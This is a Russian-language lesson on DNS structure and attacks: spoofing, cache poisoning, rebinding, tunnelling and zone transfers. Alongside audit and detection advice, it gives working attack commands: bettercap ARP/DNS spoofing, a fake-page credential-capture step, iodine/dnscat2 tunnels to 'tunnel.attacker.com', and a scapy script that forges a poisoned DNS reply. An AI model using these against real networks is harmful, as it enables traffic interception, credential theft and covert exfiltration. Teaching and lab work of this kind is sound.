DNS — «телефонная книга» интернета и одновременно одна из самых атакуемых служб. Через DNS можно подменить ответ, перенаправить жертву, протащить данные мимо firewall и деанонимизировать инфраструктуру. В уроке — устройство DNS, спуфинг, отравление кэша, rebinding и туннелирование.

## Устройство DNS

DNS (53/UDP для запросов, 53/TCP для зонных передач и больших ответов) преобразует имена в IP и обратно. Основные типы записей:

| Тип | Назначение |
|---|---|
| A / AAAA | IPv4 / IPv6 адрес |
| CNAME | псевдоним |
| MX | почтовый сервер |
| NS | авторитетный сервер зоны |
| TXT | произвольный текст (SPF, DKIM, верификации) |
| SOA | параметры зоны |
| PTR | обратное преобразование (IP→имя) |

Рекурсивный резолвер спрашивает корень → TLD → авторитетный сервер и **кэширует** ответ на время TTL. Именно кэш — цель атаки «отравление».

```bash
dig example.com A +short
dig @8.8.8.8 example.com MX
dig -x 93.184.216.34 +short      # PTR
dig example.com ANY
```

## Типы атак на DNS

- **Спуфинг ответа** — подделка UDP-ответа быстрее настоящего сервера.
- **Отравление кэша (cache poisoning)** — внедрение ложной записи в кэш резолвера (Kaminsky).
- **DNS rebinding** — смена ответа, чтобы обойти same-origin в браузере.
- **Туннелирование** — передача данных в поддоменах/TXT (эксфильтрация).
- **Zone transfer (AXFR)** — выкачивание всей зоны при мисконфиге.
- **NXDOMAIN-флуд / random subdomain** — DoS на резолвер.

## Спуфинг и отравление кэша

Спуфинг возможен, когда злоумышленник в одном L2-сегменте с жертвой (или на пути) и может предугадать transaction ID + source port. Инструменты: `dnsspoof` (dsniff), `ettercap`, `bettercap`.

```bash
# dnsspoof: подмена ответов по списку
echo '10.0.0.99 example.com' > hosts.txt
sudo dnsspoof -i eth0 -f hosts.txt

# bettercap: DNS-спуфинг
sudo bettercap -iface eth0
# (в интерактиве) set dns.spoof.domains example.com
#               set dns.spoof.address 10.0.0.99
#               dns.spoof on
```

Современные резолверы используют рандомизацию порта и ID + DNSSEC, поэтому «слепой» спуфинг сложнее, но в локальной сети (ARP-спуфинг + DNS) он по-прежнему эффективен.

## DNS rebinding

Идея: браузер жертвы резолвит `attacker.com` в IP атакующего, затем TTL истекает, и тот же домен резолвится во **внутренний** IP (например, `192.168.0.1`). Same-origin сохраняется (домен тот же), а запросы уходят во внутреннюю сеть — SSRF-подобная атака без SSRF.

```text
# псевдо-конфиг DNS-сервера атакующего: чередование A-записей
attacker.com. 1 IN A 203.0.113.10   # первый ответ
attacker.com. 1 IN A 192.168.0.1    # второй ответ (внутренний)
```

Защита: проверка Host-заголовка на внутренних сервисах, изоляция DNS pinning в браузерах.

## DNS-туннелирование

Данные кодируются в поддомены (`base32.payload.attacker.com`) или в TXT-записи. Резолвер жертвы выступает «мостом» наружу даже за строгим firewall (DNS обычно разрешён).

```bash
# серверная сторона (упрощённо) — авторитетный NS attacker.com, логирует запросы
# клиентская сторона
iodine -f -P password tunnel.attacker.com
# или dnscat2
dnscat2-client tunnel.attacker.com
```

Признаки в PCAP: много запросов к одному домену, длинные случайные метки, ответы с крупными TXT.

## Инструменты с флагами

```bash
# зонная передача (если разрешена — мисконфиг)
dig axfr @ns1.example.com example.com
# спасение данных зоны
dnsrecon -d example.com -t axfr
dnsenum example.com

# перебор поддоменов
dnsx -d example.com -w subdomains.txt -a -resp
subfinder -d example.com -all -silent
# брут резолвером
puredns bruteforce subdomains.txt example.com -r resolvers.txt
```

## Разобранный пример: отравление + туннель

Дана локальная сеть с жертвой `10.0.0.10` и атакующим `10.0.0.99`.

Шаг 1 — ARP-спуфинг шлюза (чтобы встать в путь):

```bash
sudo bettercap -iface eth0 -eval 'set arp.spoof.targets 10.0.0.10; arp.spoof on'
```

Шаг 2 — DNS-спуфинг нужного домена на свой IP, поднятие фейкового HTTP. Шаг 3 — жертва вводит креды на фейковой странице → логи. Для эксфильтрации через DNS — поднимаем авторитетный NS и запускаем iodine. Итог: и перехват, и скрытый канал.

## Edge cases и подводные камни

- **DNSSEC**: подпись ломает спуфинг — проверяйте, включена ли (`dig +dnssec`).
- **DoH/DoT**: шифрованный DNS обходит локальный спуфинг (браузеры по умолчанию).
- **Cache pinning**: некоторые резолверы игнорируют короткие TTL — rebinding не сработает.
- **0x20 encoding**: рандомизация регистра в запросе усложняет спуфинг.
- **EDNS Client Subnet** утекает подсеть клиента — учитывайте для гео-атак.

## Частые ошибки

- Спуфить без позиции «в пути» (нужен ARP-спуфинг или MITM).
- Забыть, что спуфинг ответа требует угадать ID + порт.
- Пытаться слить данные через DNS без авторитетного NS — резолвер закэширует.
- Игнорировать, что современные браузеры используют DoH.
- Не проверять AXFR — самый дешёвый способ слить зону.

## Что дальше / решение

Маршрут: (1) проверьте AXFR и поддомены; (2) в локальной сети — ARP+DNS-спуфинг для перехвата; (3) для обхода firewall — DNS-туннель; (4) для SSRF-эскалации — DNS rebinding. Решение: сначала определите позицию (в пути или нет) и поддержку DNSSEC/DoH — это диктует выбор атаки.

## Разобранный пример: полный цикл отравления кэша

Лаборатория: резолвер `10.0.0.53`, жертва — клиент, атакующий в том же сегменте. Цель — подсунуть резолверу ложную A-запись для `example.com`.

Шаг 1. Наблюдаем, как резолвер ходит наружу:

```bash
tcpdump -ni eth0 -vv 'udp port 53' -c 5
# 10.0.0.53.54321 > 198.51.100.1.53: 12345+ A? example.com. (29)
```

Шаг 2. Видим ID `12345` и порт `54321`. В off-path-сценарии их надо угадать — отсюда важность рандомизации. В on-path мы их видим.

Шаг 3. Отправляем поддельный ответ быстрее настоящего:

```bash
python3 - <<'PY'
from scapy.all import *
pkt = IP(src="198.51.100.1", dst="10.0.0.53")/UDP(sport=53, dport=54321)/\
      DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname="example.com"),
          an=DNSRR(rrname="example.com", ttl=86400, rdata="10.0.0.99"))
send(pkt, iface="eth0", verbose=0)
PY
```

Шаг 4. Проверяем, что запись попала в кэш:

```bash
dig @10.0.0.53 example.com +short
# 10.0.0.99   ← подмена удалась
```

Ключевые параметры успеха: успеть раньше легитимного ответа, совпасть по ID/порту/имени, и (для Kaminsky) заставить резолвер спрашивать как можно чаще.

## Reference-таблица: типы записей и их применение в разведке

| Запись | Что даёт в OSINT/пентесте |
|---|---|
| A / AAAA | IP-адреса, поиск origin за CDN |
| CNAME | цепочки, поиск subdomain takeover |
| MX | почтовые провайдеры, спам-инфраструктура |
| TXT | SPF/DKIM/DMARC, верификации, иногда ключи |
| NS | кто хостит DNS, возможность AXFR |
| SOA | серийный номер (детект изменений), primary NS |
| PTR | обратные имена, атрибуция диапазонов |
| SRV | сервисы (AD: `_ldap._tcp`, `_kerberos._tcp`) |
| CAA | какие CA вправе выпускать сертификаты |

## Чек-лист аудита DNS-конфигурации

1. Есть ли DNSSEC на зоне (`dig +dnssec`) и валидирует ли его резолвер?
2. Разрешён ли AXFR (`dig axfr @ns example.com`)?
3. Какой TTL у записей — не подозрительно ли короткий?
4. Настроены ли SPF/DKIM/DMARC в TXT (защита почты от спуфинга)?
5. Разрешены ли прямые DNS-запросы наружу с рабочих станций?
6. Есть ли split-horizon DNS (разные ответы внутри/снаружи)?
7. Мониторятся ли аномалии объёма и энтропии запросов?

## Где пригодится

- **CTF:** DNS-задачи, эксфильтрация данных, разбор подозрительных запросов в PCAP.
- **Bug bounty:** SSRF через DNS rebinding, обход allowlist, подмена ответов.
- **Пентест:** внутренние DNS-атаки, релей и перехват в сегменте.
- **Работа (SOC/IR):** детект DNS-туннелей и отравления кэша, разбор инцидентов.
